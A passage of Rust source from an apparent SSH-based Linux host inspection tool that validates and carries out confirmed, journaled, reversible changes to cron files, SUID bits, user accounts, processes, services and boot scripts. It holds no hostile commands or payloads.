                line: validated_line_number(cell(3, "shell configuration line")?)?,
            },
            ArtifactInvestigationAction::Sudoers(action) => {
                let principal = validated_sudo_principal(name)?;
                let username = is_valid_username(&principal).then_some(principal.clone());
                if action.requires_username() && username.is_none() {
                    return Err(CoreError::validation(
                        "sudoers investigation",
                        "the selected principal is not a concrete Linux username",
                    ));
                }
                ArtifactIdentity::Sudoers {
                    row_id: row.id.clone(),
                    principal,
                    username,
                    source: validated_sudoers_source(cell(4, "sudoers source")?)?,
                }
            }
            ArtifactInvestigationAction::SuidFile(_) => ArtifactIdentity::SuidFile {
                row_id: row.id.clone(),
                path: validated_absolute_path(name)?,
            },
            ArtifactInvestigationAction::SshKey(_) => {
                let username = validated_username(name)?;
                let key_type = cell(1, "SSH key type")?;
                let key_content = cell(2, "SSH key content")?;
                if !is_valid_ssh_key_type(key_type) || !is_valid_ssh_key_content(key_content) {
                    return Err(invalid_detail_key("SSH public key"));
                }
                ArtifactIdentity::SshKey {
                    row_id: row.id.clone(),
                    path: validated_authorized_keys_path(cell(4, "authorized_keys path")?)?,
                    username,
                    key_type: key_type.to_owned(),
                    key_content: key_content.to_owned(),
                }
            }
            _ => return Err(invalid_detail_key("system artifact identity")),
        };
        Ok(ArtifactInvestigationRequest { identity, action })
    }

    pub fn artifact_mutation_request(
        &self,
        row_id: &str,
        action: ArtifactMutationAction,
    ) -> CoreResult<ArtifactMutationRequest> {
        if self.tab != action.tab() {
            return Err(CoreError::validation(
                "system artifact mutation",
                "the action does not belong to the selected inventory",
            ));
        }
        let row = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .ok_or_else(|| CoreError::NotFound {
                entity: "system information row",
                id: bounded_text(row_id, 256),
            })?;
        let cell = |index: usize, subject: &'static str| {
            row.cells
                .get(index)
                .map(String::as_str)
                .ok_or_else(|| invalid_detail_key(subject))
        };
        let identity = match action {
            ArtifactMutationAction::DeleteCronFile => {
                let path = validated_deletable_cron_path(cell(3, "cron source file")?)?;
                ArtifactMutationIdentity::CronFile {
                    row_id: row.id.clone(),
                    path,
                }
            }
            ArtifactMutationAction::CommentShellLine => {
                let path = RemotePath::new(validated_shell_config_path(cell(
                    0,
                    "shell configuration path",
                )?)?)?;
                let line = validated_line_number(cell(3, "shell configuration line")?)?;
                let displayed_content = validated_shell_line(cell(4, "shell configuration line")?)?;
                if displayed_content.trim_start().starts_with('#') {
                    return Err(CoreError::validation(
                        "shell configuration mutation",
                        "the selected line is already a comment",
                    ));
                }
                ArtifactMutationIdentity::ShellLine {
                    row_id: row.id.clone(),
                    path,
                    line,
                    displayed_content,
                }
            }
            ArtifactMutationAction::RemoveSuidBits | ArtifactMutationAction::QuarantineSuidFile => {
                let path = validated_suid_path(cell(0, "SUID file path")?)?;
                let displayed_mode = validated_octal_mode(cell(1, "SUID file mode")?)?;
                if displayed_mode & 0o6000 == 0 {
                    return Err(CoreError::validation(
                        "SUID file mutation",
                        "the selected row no longer carries SUID or SGID bits",
                    ));
                }
                ArtifactMutationIdentity::SuidFile {
                    row_id: row.id.clone(),
                    path,
                    displayed_mode,
                }
            }
            ArtifactMutationAction::AddManagedModuleBlacklist
            | ArtifactMutationAction::RemoveManagedModuleBlacklist => {
                let module = cell(0, "kernel module name")?;
                if !is_valid_module_name(module) {
                    return Err(invalid_detail_key("kernel module name"));
                }
                ArtifactMutationIdentity::KernelModulePolicy {
                    row_id: row.id.clone(),
                    module: module.to_owned(),
                    path: managed_module_policy_path(module)?,
                }
            }
        };
        Ok(ArtifactMutationRequest { identity, action })
    }

    pub fn user_account_request(
        &self,
        row_id: &str,
        action: UserAccountAction,
    ) -> CoreResult<UserAccountRequest> {
        let (row_id, username) = match self.tab {
            SystemInfoTab::Users => {
                let identity = self.user_identity(row_id)?;
                // root itself is never offered for deletion. A *second* UID 0
                // account is — it is the commonest backdoor there is.
                if action == UserAccountAction::Delete && identity.username == "root" {
                    return Err(CoreError::validation(
                        "user account operation",
                        "the root account is not deleted",
                    ));
                }
                (identity.row_id, identity.username)
            }
            // Deletion is offered where the account itself is listed, with its
            // UID in hand, not from a line of login history.
            SystemInfoTab::LoginHistory if action == UserAccountAction::Delete => {
                return Err(CoreError::validation(
                    "user account operation",
                    "accounts are deleted from the user inventory",
                ));
            }
            SystemInfoTab::LoginHistory => {
                let identity = self.login_identity(row_id)?;
                (identity.row_id, identity.username)
            }
            _ => {
                return Err(CoreError::validation(
                    "user account operation",
                    "the selected row is not from a user or login-history inventory",
                ));
            }
        };
        Ok(UserAccountRequest {
            row_id,
            username,
            action,
        })
    }

    pub fn network_identity(&self, row_id: &str) -> CoreResult<NetworkConnectionIdentity> {
        network_identity_from_table(self, row_id)
    }

    pub fn network_investigation_request(
        &self,
        row_id: &str,
        action: NetworkInvestigationAction,
    ) -> CoreResult<NetworkInvestigationRequest> {
        let identity = self.network_identity(row_id)?;
        validate_network_action(&identity, action)?;
        Ok(NetworkInvestigationRequest { identity, action })
    }

    pub fn network_disconnect_request(&self, row_id: &str) -> CoreResult<NetworkDisconnectRequest> {
        let identity = self.network_identity(row_id)?;
        validate_network_disconnect(&identity)?;
        Ok(NetworkDisconnectRequest { identity })
    }
}

#[derive(Debug, Clone, Default, Eq, PartialEq, Serialize, Deserialize)]
pub struct SystemInfoSummary {
    pub hostname: String,
    pub operating_system: String,
    pub kernel: String,
    pub architecture: String,
    pub virtualization: String,
    pub boot_time: String,
    pub timezone: String,
    pub locale: String,
    pub init_system: String,
    pub package_manager: String,
    pub selinux: String,
    pub apparmor: String,
    pub uptime_seconds: u64,
    pub load_average: [String; 3],
    pub cpu_model: String,
    pub cpu_cores: u32,
    pub memory_total_bytes: u64,
    pub memory_available_bytes: u64,
    pub swap_total_bytes: u64,
    pub swap_free_bytes: u64,
    pub root_device: String,
    pub root_filesystem: String,
    pub root_total_bytes: u64,
    pub root_available_bytes: u64,
    pub primary_ip: String,
    pub default_gateway: String,
    pub dns_servers: String,
    pub process_count: usize,
    pub logged_in_users: usize,
    pub network_connections: usize,
    pub received_bytes: u64,
    pub transmitted_bytes: u64,
}

#[derive(Debug, Clone)]
pub struct SystemInfoService {
    ssh: SshService,
    sftp: SftpService,
    target: Arc<TargetContext>,
}

impl SystemInfoService {
    pub fn new(ssh: SshService, sftp: SftpService, target: Arc<TargetContext>) -> Self {
        Self { ssh, sftp, target }
    }

    pub async fn summary(&self, session: &BoundSshSession) -> CoreResult<SystemInfoSummary> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, SUMMARY_COMMAND.to_owned(), Duration::from_secs(15))
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("system summary", &output));
        }
        parse_summary(&output.output)
    }

    pub async fn collect(
        &self,
        session: &BoundSshSession,
        request: &SystemInfoRequest,
    ) -> CoreResult<SystemInfoTable> {
        if !(1..=MAX_ROWS).contains(&request.maximum_rows) {
            return Err(CoreError::Validation {
                subject: "system information row limit",
                message: format!("must be between 1 and {MAX_ROWS}"),
            });
        }
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(
                session,
                request.tab.command(request.maximum_rows),
                request.tab.timeout(),
            )
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out {
            return Err(command_failed(request.tab.label(), &output));
        }
        // The exit status is not read. Several of these commands legitimately
        // end non-zero while still having said something useful — a `find` that
        // hit an unreadable directory, a `grep` that matched nothing — so
        // failing on it would throw away answers.
        //
        // What that costs: a command whose real work failed (a docker daemon
        // that is down, a kubectl with no cluster) comes back empty and reads
        // as "this machine has none". `missing_tool` covers the case where the
        // tool is not installed, but not this one, and a pipeline hides it
        // anyway — `docker ps | head | awk` exits with awk's status, so the
        // failure never reaches here in the first place. Telling the two apart
        // needs each command to report its own tool's status, which is a change
        // to all of them rather than a check in this function.
        Ok(parse_table(request, &output.output))
    }

    pub async fn detail(
        &self,
        session: &BoundSshSession,
        request: &SystemInfoDetailRequest,
    ) -> CoreResult<SystemInfoDetail> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command(), Duration::from_secs(15))
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out {
            return Err(command_failed("system information detail", &output));
        }
        Ok(parse_detail(request, &output.output))
    }

    pub async fn investigate_process(
        &self,
        session: &BoundSshSession,
        request: &ProcessInvestigationRequest,
    ) -> CoreResult<ProcessInvestigationResult> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command(), request.action.timeout())
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("process investigation", &output));
        }
        let (bounded, truncated) = bounded_process_output(&output.output);
        Ok(ProcessInvestigationResult {
            row_id: request.row_id.clone(),
            pid: request.pid,
            action: request.action,
            output: bounded,
            truncated,
        })
    }

    pub async fn investigate_service(
        &self,
        session: &BoundSshSession,
        request: &ServiceInvestigationRequest,
    ) -> CoreResult<ServiceInvestigationResult> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command(), request.action.timeout())
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("service investigation", &output));
        }
        let (bounded, truncated) = bounded_service_output(&output.output);
        Ok(ServiceInvestigationResult {
            row_id: request.row_id.clone(),
            unit: request.unit.clone(),
            action: request.action,
            output: bounded,
            truncated,
        })
    }

    pub async fn investigate_user(
        &self,
        session: &BoundSshSession,
        request: &UserInvestigationRequest,
    ) -> CoreResult<UserInvestigationResult> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command(), request.action.timeout())
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("user investigation", &output));
        }
        let (bounded, truncated) = bounded_user_output(&output.output);
        Ok(UserInvestigationResult {
            row_id: request.identity.row_id.clone(),
            username: request.identity.username.clone(),
            action: request.action,
            output: bounded,
            truncated,
        })
    }

    pub async fn investigate_login(
        &self,
        session: &BoundSshSession,
        request: &LoginInvestigationRequest,
    ) -> CoreResult<LoginInvestigationResult> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command()?, request.action.timeout())
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("login-history investigation", &output));
        }
        let (bounded, truncated) = bounded_login_output(&output.output);
        Ok(LoginInvestigationResult {
            row_id: request.identity.row_id.clone(),
            username: request.identity.username.clone(),
            source: request.identity.source,
            action: request.action,
            output: bounded,
            truncated,
        })
    }

    pub async fn investigate_artifact(
        &self,
        session: &BoundSshSession,
        request: &ArtifactInvestigationRequest,
    ) -> CoreResult<ArtifactInvestigationResult> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command()?, request.action.timeout())
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("system artifact investigation", &output));
        }
        let (bounded, truncated) = bounded_artifact_output(&output.output);
        Ok(ArtifactInvestigationResult {
            row_id: request.identity.row_id().to_owned(),
            action: request.action,
            output: bounded,
            truncated,
        })
    }

    pub async fn plan_artifact_mutation(
        &self,
        session: &BoundSshSession,
        request: &ArtifactMutationRequest,
    ) -> CoreResult<ArtifactMutationPlan> {
        self.target.validate(session.target())?;
        let kind = match &request.identity {
            ArtifactMutationIdentity::CronFile { path, .. } => {
                let bound = self
                    .sftp
                    .bind_session(session.target().clone(), session.session_id())
                    .await?;
                let content = self.sftp.read_file(&bound, path).await?;
                if content.is_empty() {
                    return Err(CoreError::validation(
                        "cron file mutation",
                        "refuses to remove an empty or unreadable cron file",
                    ));
                }
                ArtifactMutationPlanKind::Sftp(Box::new(self.sftp.plan(
                    &bound,
                    SftpMutation::RemoveFileIfMatch {
                        path: path.clone(),
                        expected_sha256: content_sha256(&content),
                    },
                )?))
            }
            ArtifactMutationIdentity::ShellLine {
                path,
                line,
                displayed_content,
                ..
            } => {
                let bound = self
                    .sftp
                    .bind_session(session.target().clone(), session.session_id())
                    .await?;
                let content = self.sftp.read_file(&bound, path).await?;
                let replacement = comment_shell_line(&content, *line, displayed_content)?;
                ArtifactMutationPlanKind::Sftp(Box::new(self.sftp.plan(
                    &bound,
                    SftpMutation::AtomicWriteIfMatch {
                        path: path.clone(),
                        expected_sha256: content_sha256(&content),
                        expected_canonical_path: None,
                        backup_directory: None,
                        content: replacement,
                    },
                )?))
            }
            ArtifactMutationIdentity::SuidFile {
                path,
                displayed_mode,
                ..
            } => {
                let snapshot = self.suid_file_snapshot(session, path).await?;
                if snapshot.mode != *displayed_mode || snapshot.mode & 0o6000 == 0 {
                    return Err(CoreError::validation(
                        "SUID file mutation",
                        "file mode changed after the inventory row was collected",
                    ));
                }
                let target_mode = match request.action {
                    ArtifactMutationAction::RemoveSuidBits => snapshot.mode & !0o6000,
                    ArtifactMutationAction::QuarantineSuidFile => 0,
                    _ => unreachable!("validated SUID mutation action"),
                };
                let backup_directory = path.parent()?.child(".lovelyres-backups")?;
                let backup_path =
                    backup_directory.child(&format!("{}-{}", Uuid::new_v4(), path.file_name()?))?;
                let mut operation = OperationPlan::new(
                    session.target().clone(),
                    format!(
                        "{} {}（当前模式 {:04o}，SHA-256 {}）。先写入受管备份 {}，再修改同一文件描述符的权限；内容或身份变化将拒绝执行。",
                        request.action.label(),
                        path.as_str(),
                        snapshot.mode,
                        snapshot.sha256,
                        backup_path.as_str(),
                    ),
                    true,
                    Some(format!(
                        "验证原文件与受管备份后，将 {} 的权限恢复为 {:04o}。",
                        path.as_str(),
                        snapshot.mode
                    )),
                )?;
                operation
                    .metadata
                    .insert("source".to_owned(), "system-info-suid".to_owned());
                operation
                    .metadata
                    .insert("path".to_owned(), path.as_str().to_owned());
                operation
                    .metadata
                    .insert("action".to_owned(), format!("{:?}", request.action));
                operation
                    .metadata
                    .insert("snapshot-sha256".to_owned(), snapshot.sha256.clone());
                operation
                    .metadata
                    .insert("backup-path".to_owned(), backup_path.as_str().to_owned());
                ArtifactMutationPlanKind::Suid(Box::new(SuidPermissionPlan {
                    operation,
                    snapshot,
                    target_mode,
                    backup_directory,
                    backup_path,
                }))
            }
            ArtifactMutationIdentity::KernelModulePolicy { module, path, .. } => {
                let bound = self
                    .sftp
                    .bind_session(session.target().clone(), session.session_id())
                    .await?;
                let expected_content = managed_module_policy_content(module)?;
                let mutation = match request.action {
                    ArtifactMutationAction::AddManagedModuleBlacklist => {
                        if self.sftp.exists(&bound, path).await? {
                            return Err(CoreError::validation(
                                "kernel module policy",
                                "the managed policy path already exists; inspect or remove it before creating a new policy",
                            ));
                        }
                        SftpMutation::CreateFile {
                            path: path.clone(),
                            content: expected_content,
                            mode: Some(0o644),
                        }
                    }
                    ArtifactMutationAction::RemoveManagedModuleBlacklist => {
                        if !self.sftp.exists(&bound, path).await? {
                            return Err(CoreError::NotFound {
                                entity: "LovelyHawk kernel module policy",
                                id: path.as_str().to_owned(),
                            });
                        }
                        let content = self.sftp.read_file(&bound, path).await?;
                        if content != expected_content {
                            return Err(CoreError::validation(
                                "kernel module policy",
                                "refuses to remove a policy that is not the exact LovelyHawk-managed content",
                            ));
                        }
                        SftpMutation::RemoveFileIfMatch {
                            path: path.clone(),
                            expected_sha256: content_sha256(&content),
                        }
                    }
                    _ => unreachable!("validated kernel module policy action"),
                };
                ArtifactMutationPlanKind::Sftp(Box::new(self.sftp.plan(&bound, mutation)?))
            }
        };
        self.target.validate(session.target())?;
        Ok(ArtifactMutationPlan {
            row_id: request.row_id().to_owned(),
            action: request.action,
            path: request.path().clone(),
            kind,
        })
    }

    pub async fn execute_artifact_mutation(
        &self,
        session: &BoundSshSession,
        plan: ArtifactMutationPlan,
        confirmation: DangerousConfirmation,
        journal: &dyn OperationJournal,
    ) -> CoreResult<ArtifactMutationOutcome> {
        let row_id = plan.row_id;
        let action = plan.action;
        let path = plan.path;
        let (verification, restored_after_failed_verification) = match plan.kind {
            ArtifactMutationPlanKind::Sftp(mut operation) => {
                operation.confirm(confirmation)?;
                let verification = match operation.execute_and_verify().await {
                    Ok(verification) => verification,
                    Err(error) if operation.state() == OperationState::VerificationFailed => {
                        return match operation.restore().await {
                            Ok(()) => Err(error),
                            Err(restore_error) => Err(CoreError::validation(
                                "system artifact verification",
                                format!("{error}; automatic restore also failed: {restore_error}"),
                            )),
                        };
                    }
                    Err(error) => return Err(error),
                };
                if verification.passed {
                    (verification, false)
                } else {
                    operation.restore().await?;
                    (verification, true)
                }
            }
            ArtifactMutationPlanKind::Suid(permission_plan) => {
                let executor = SuidPermissionExecutor {
                    service: self,
                    session,
                    plan: &permission_plan,
                };
                let mut operation = PlannedOperation::plan(permission_plan.operation.clone());
                operation.confirm(confirmation)?;
                if let Err(error) = operation.execute(&self.target, &executor).await {
                    if operation.state() == OperationState::StaleAfterExecution {
                        operation.journal(journal)?;
                    }
                    return Err(error);
                }
                operation.journal(journal)?;
                let verification = match operation.verify(&self.target, &executor, journal).await {
                    Ok(verification) => verification,
                    Err(verification_error) => {
                        return match operation.restore(&self.target, &executor, journal).await {
                            Ok(()) => Err(verification_error),
                            Err(restore_error) => Err(CoreError::validation(
                                "SUID permission verification",
                                format!(
                                    "{verification_error}; automatic restore also failed: {restore_error}"
                                ),
                            )),
                        };
                    }
                };
                if verification.passed {
                    (verification, false)
                } else {
                    operation.restore(&self.target, &executor, journal).await?;
                    (verification, true)
                }
            }
        };
        Ok(ArtifactMutationOutcome {
            row_id,
            action,
            path,
            verification,
            restored_after_failed_verification,
        })
    }

    pub async fn investigate_network(
        &self,
        session: &BoundSshSession,
        request: &NetworkInvestigationRequest,
    ) -> CoreResult<NetworkInvestigationResult> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command()?, request.action.timeout())
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("network investigation", &output));
        }
        let (bounded, truncated) = bounded_network_output(&output.output);
        Ok(NetworkInvestigationResult {
            row_id: request.identity.row_id.clone(),
            action: request.action,
            output: bounded,
            truncated,
        })
    }

    pub async fn plan_user_account(
        &self,
        session: &BoundSshSession,
        request: &UserAccountRequest,
    ) -> CoreResult<UserAccountPlan> {
        self.target.validate(session.target())?;
        let snapshot = self
            .user_account_snapshot(session, &request.username)
            .await?
            .ok_or_else(|| CoreError::NotFound {
                entity: "user account",
                id: request.username.clone(),
            })?;
        validate_user_account_precondition(&snapshot, request.action)?;
        // What a person would need to recreate the account by hand. Read only
        // for a deletion, which has no automatic way back.
        let groups = if request.action == UserAccountAction::Delete {
            Some(self.user_account_groups(session, &snapshot.username).await)
        } else {
            None
        };
        self.target.validate(session.target())?;
        let mut operation = match &groups {
            Some(groups) => OperationPlan::new(
                session.target().clone(),
                user_account_delete_summary(&snapshot, groups.as_deref()),
                true,
                None,
            )?,
            None => {
                let session_warning = if snapshot.username == snapshot.session_username {
                    " 这是当前 SSH 登录账户，操作可能阻止重新连接。"
                } else {
                    ""
                };
                OperationPlan::new(
                    session.target().clone(),
                    format!(
                        "{} {}（UID {}，当前{}）。执行后将回读账户状态；验证失败时恢复确认前锁定状态。{}",
                        request.action.label(),
                        snapshot.username,
                        snapshot.uid,
                        snapshot.password_state.display(),
                        session_warning,
                    ),
                    true,
                    Some(format!(
                        "把账户 {} 恢复为确认前的状态（{}）。",
                        snapshot.username,
                        snapshot.password_state.display(),
                    )),
                )?
            }
        };
        operation
            .metadata
            .insert("source".to_owned(), "system-info-user".to_owned());
        operation
            .metadata
            .insert("username".to_owned(), snapshot.username.clone());
        operation
            .metadata
            .insert("uid".to_owned(), snapshot.uid.to_string());
        operation.metadata.insert(
            "action".to_owned(),
            request.action.metadata_key().to_owned(),
        );
        if let Some(groups) = &groups {
            // Kept in the journal so the account can be rebuilt by hand. The
            // password hash is deliberately not among them.
            operation
                .metadata
                .insert("gid".to_owned(), snapshot.gid.to_string());
            operation
                .metadata
                .insert("home".to_owned(), snapshot.home.clone());
            operation
                .metadata
                .insert("shell".to_owned(), snapshot.shell.clone());
            operation.metadata.insert(
                "groups".to_owned(),
                groups.clone().unwrap_or_else(|| "unknown".to_owned()),
            );
        }
        operation.metadata.insert(
            "snapshot-sha256".to_owned(),
            user_account_snapshot_sha256(&snapshot),
        );
        Ok(UserAccountPlan {
            operation,
            row_id: request.row_id.clone(),
            snapshot,
            action: request.action,
        })
    }

    pub async fn execute_user_account(
        &self,
        session: &BoundSshSession,
        plan: UserAccountPlan,
        confirmation: DangerousConfirmation,
        journal: &dyn OperationJournal,
    ) -> CoreResult<UserAccountOutcome> {
        let executor = UserAccountExecutor {
            service: self,
            session,
            plan: &plan,
        };
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        if plan.action == UserAccountAction::Delete {
            // There is no way back from a deletion, so a failed verification is
            // reported, not "restored". What is said instead is whether the
            // account is still exactly as it was confirmed — i.e. nothing
            // happened — which is the one thing the operator needs to know.
            let verification = operation.verify(&self.target, &executor, journal).await?;
            let unchanged = verification.passed
                || self
                    .user_account_snapshot(session, &plan.snapshot.username)
                    .await
                    .ok()
                    .flatten()
                    .as_ref()
                    == Some(&plan.snapshot);
            return Ok(UserAccountOutcome {
                username: plan.snapshot.username,
                action: plan.action,
                restored_after_failed_verification: !verification.passed && unchanged,
                verification,
            });
        }
        let verification = match operation.verify(&self.target, &executor, journal).await {
            Ok(verification) => verification,
            Err(verification_error) => {
                return match operation.restore(&self.target, &executor, journal).await {
                    Ok(()) => Err(verification_error),
                    Err(restore_error) => Err(CoreError::validation(
                        "user account verification",
                        format!(
                            "{verification_error}; automatic restore also failed: {restore_error}"
                        ),
                    )),
                };
            }
        };
        let restored_after_failed_verification = if verification.passed {
            false
        } else {
            operation.restore(&self.target, &executor, journal).await?;
            true
        };
        Ok(UserAccountOutcome {
            username: plan.snapshot.username,
            action: plan.action,
            verification,
            restored_after_failed_verification,
        })
    }

    pub async fn plan_process_signal(
        &self,
        session: &BoundSshSession,
        request: &ProcessSignalRequest,
    ) -> CoreResult<ProcessSignalPlan> {
        self.target.validate(session.target())?;
        let snapshot = self
            .process_identity_snapshot(session, request.pid)
            .await?
            .ok_or_else(|| CoreError::NotFound {
                entity: "process",
                id: request.pid.to_string(),
            })?;
        self.target.validate(session.target())?;
        let mut operation = OperationPlan::new(
            session.target().clone(),
            format!(
                "{} PID {}（{}，启动时钟 {}）。此操作不可恢复。",
                request.signal.label(),
                snapshot.pid,
                snapshot.command_name,
                snapshot.start_time_ticks
            ),
            true,
            None,
        )?;
        operation
            .metadata
            .insert("source".to_owned(), "system-info-process".to_owned());
        operation
            .metadata
            .insert("pid".to_owned(), snapshot.pid.to_string());
        operation.metadata.insert(
            "start-time-ticks".to_owned(),
            snapshot.start_time_ticks.to_string(),
        );
        operation
            .metadata
            .insert("signal".to_owned(), request.signal.shell_name().to_owned());
        Ok(ProcessSignalPlan {
            operation,
            row_id: request.row_id.clone(),
            snapshot,
            signal: request.signal,
        })
    }

    pub async fn execute_process_signal(
        &self,
        session: &BoundSshSession,
        plan: ProcessSignalPlan,
        confirmation: DangerousConfirmation,
        journal: &dyn OperationJournal,
    ) -> CoreResult<ProcessSignalOutcome> {
        let executor = ProcessSignalExecutor {
            service: self,
            session,
            plan: &plan,
        };
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = operation.verify(&self.target, &executor, journal).await?;
        Ok(ProcessSignalOutcome {
            pid: plan.snapshot.pid,
            signal: plan.signal,
            verification,
        })
    }

    pub async fn plan_service_runtime(
        &self,
        session: &BoundSshSession,
        request: &ServiceRuntimeRequest,
    ) -> CoreResult<ServiceRuntimePlan> {
        self.target.validate(session.target())?;
        let snapshot = self.service_state_snapshot(session, &request.unit).await?;
        validate_service_runtime_precondition(&snapshot, request.action)?;
        self.target.validate(session.target())?;
        let restore_description = match request.action {
            ServiceRuntimeAction::Enable => Some(format!(
                "若启用状态回读失败，恢复 {} 为 disabled。",
                snapshot.unit
            )),
            ServiceRuntimeAction::Disable => Some(format!(
                "若禁用状态回读失败，恢复 {} 为 enabled。",
                snapshot.unit
            )),
            ServiceRuntimeAction::Mask => Some(format!(
                "若屏蔽状态回读失败，解除屏蔽并恢复 {} 为 {}。",
                snapshot.unit, snapshot.unit_file_state
            )),
            _ => None,
        };
        let recovery_note = if restore_description.is_some() {
            "单元文件状态回读失败时将自动恢复确认前状态。"
        } else {
            "运行状态操作无法自动恢复。"
        };
        let mut operation = OperationPlan::new(
            session.target().clone(),
            format!(
                "{} {}（当前：{} / {}，自启：{}）。执行后将重新读取 systemd 状态验证；{}",
                request.action.label(),
                snapshot.unit,
                snapshot.active_state,
                snapshot.sub_state,
                snapshot.unit_file_state,
                recovery_note,
            ),
            true,
            restore_description,
        )?;
        operation
            .metadata
            .insert("source".to_owned(), "system-info-service".to_owned());
        operation
            .metadata
            .insert("unit".to_owned(), snapshot.unit.clone());
        operation
            .metadata
            .insert("action".to_owned(), request.action.command().to_owned());
        operation.metadata.insert(
            "snapshot-sha256".to_owned(),
            service_snapshot_sha256(&snapshot),
        );
        Ok(ServiceRuntimePlan {
            operation,
            row_id: request.row_id.clone(),
            snapshot,
            action: request.action,
        })
    }

    pub async fn execute_service_runtime(
        &self,
        session: &BoundSshSession,
        plan: ServiceRuntimePlan,
        confirmation: DangerousConfirmation,
        journal: &dyn OperationJournal,
    ) -> CoreResult<ServiceRuntimeOutcome> {
        let executor = ServiceRuntimeExecutor {
            service: self,
            session,
            plan: &plan,
        };
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
        if let Err(error) = operation.execute(&self.target, &executor).await {
            if operation.state() == OperationState::StaleAfterExecution {
                operation.journal(journal)?;
            }
            return Err(error);
        }
        operation.journal(journal)?;
        let verification = match operation.verify(&self.target, &executor, journal).await {
            Ok(verification) => verification,
            Err(verification_error) if plan.operation.restore_description.is_some() => {
                return match operation.restore(&self.target, &executor, journal).await {
                    Ok(()) => Err(verification_error),
                    Err(restore_error) => Err(CoreError::validation(
                        "service runtime verification",
                        format!(
                            "{verification_error}; automatic restore also failed: {restore_error}"
                        ),
                    )),
                };
            }
            Err(error) => return Err(error),
        };
        let restored_after_failed_verification =
            if !verification.passed && plan.operation.restore_description.is_some() {
                operation.restore(&self.target, &executor, journal).await?;
                true
            } else {
                false
            };
        Ok(ServiceRuntimeOutcome {
            unit: plan.snapshot.unit,
            action: plan.action,
            verification,
            restored_after_failed_verification,
        })
    }

    /// Describes taking a boot script into or out of the boot sequence.
    ///
    /// Nothing is changed here. The boot directories are read first, because
    /// the row on screen may be minutes old and the precondition has to be
    /// checked against what the host holds now.
    pub async fn plan_boot_script_runtime(
        &self,
        session: &BoundSshSession,
        request: &BootScriptRuntimeRequest,
    ) -> CoreResult<BootScriptRuntimePlan> {
        self.target.validate(session.target())?;
        let snapshot = self
            .boot_script_state_snapshot(session, &request.name, &request.path)
            .await?
            .ok_or_else(|| CoreError::NotFound {
                entity: "boot script",
                id: bounded_text(&request.name, 128),
            })?;
        validate_boot_script_precondition(&snapshot, request.action)?;
        self.target.validate(session.target())?;
        let manager = snapshot
            .manager
            .ok_or_else(|| {
                CoreError::validation(
                    "boot script runtime",
                    "this host has none of rc-update, update-rc.d or chkconfig",
                )
            })?
            .name();
        let restore_description = Some(match request.action {
            ServiceRuntimeAction::Enable => format!(
                "若启用状态回读失败，用 {manager} 把 {} 重新移出开机序列（回到没有启动链接的状态）。",
                snapshot.name
            ),
            _ => format!(
                "若禁用状态回读失败，用 {manager} 把 {} 重新加回开机序列。",
                snapshot.name
            ),
        });
        let mut operation = OperationPlan::new(
            session.target().clone(),
            format!(
                "{} {}（脚本 {}，当前{}；启动链接：{}）。将用 {manager} 修改开机链接，执行后重新读取链接验证；回读失败会自动恢复确认前的状态。",
                request.action.label(),
                snapshot.name,
                snapshot.path,
                if snapshot.enabled() {
                    "已加入开机序列"
                } else {
                    "不在开机序列中"
                },
                if snapshot.start_links.is_empty() {
                    "无".to_owned()
                } else {
                    snapshot.start_links.join(" ")
                },
            ),
            true,
            restore_description,
        )?;
        operation
            .metadata
            .insert("source".to_owned(), "system-info-boot-script".to_owned());
        operation
            .metadata
            .insert("script".to_owned(), snapshot.path.clone());
        operation
            .metadata
            .insert("manager".to_owned(), manager.to_owned());
        operation
            .metadata
            .insert("action".to_owned(), request.action.command().to_owned());
        operation.metadata.insert(
            "snapshot-sha256".to_owned(),
            boot_script_snapshot_sha256(&snapshot),
        );
        Ok(BootScriptRuntimePlan {
            operation,
            row_id: request.row_id.clone(),
            snapshot,
            action: request.action,
        })
    }

    /// Runs the approved boot-link change once, reads the links back, and puts
    /// them the way they were when the read-back disagrees.
    pub async fn execute_boot_script_runtime(
        &self,
        session: &BoundSshSession,
        plan: BootScriptRuntimePlan,
        confirmation: DangerousConfirmation,
        journal: &dyn OperationJournal,
    ) -> CoreResult<BootScriptRuntimeOutcome> {
        let executor = BootScriptRuntimeExecutor {
            service: self,
            session,
            plan: &plan,
        };
        let mut operation = PlannedOperation::plan(plan.operation.clone());
        operation.confirm(confirmation)?;
